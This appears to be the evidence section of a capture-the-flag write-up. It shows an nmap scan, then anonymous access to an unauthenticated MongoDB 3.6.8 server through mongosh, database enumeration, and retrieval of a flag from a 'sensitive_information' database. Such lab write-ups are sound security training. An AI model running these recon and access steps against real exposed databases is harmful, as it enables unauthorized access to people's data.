## 📂 Evidence

### Recon (Nmap)
```bash
nmap -sV -p- <TARGET_IP>
Starting Nmap 7.95 ( https://nmap.org ) at <DATE>
Nmap scan report for <TARGET_IP>
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

--Download client (mongosh 2.3.2)--

curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
tar xvf mongosh-2.3.2-linux-x64.tgz
cd <PATH>/mongosh-2.3.2-linux-x64/bin

--Connect (anonymous access)--

./mongosh mongodb://<TARGET_IP>:27017

# Using MongoDB: 3.6.8
# Using Mongosh: 2.3.2

# Server warning:
# ** Access control is not enabled for the database.
# ** Read and write access to data and configuration is unrestricted.

--Enumeration--

show dbs;
# admin, config, local, sensitive_information, users

use sensitive_information
# switched to db sensitive_information

show collections
# flag

db.flag.find();
# [
#   {
#     _id: ObjectId('...'),
#     flag: '1b6e6fb359e7c40241b6d431427ba6ea'
#   }
# ]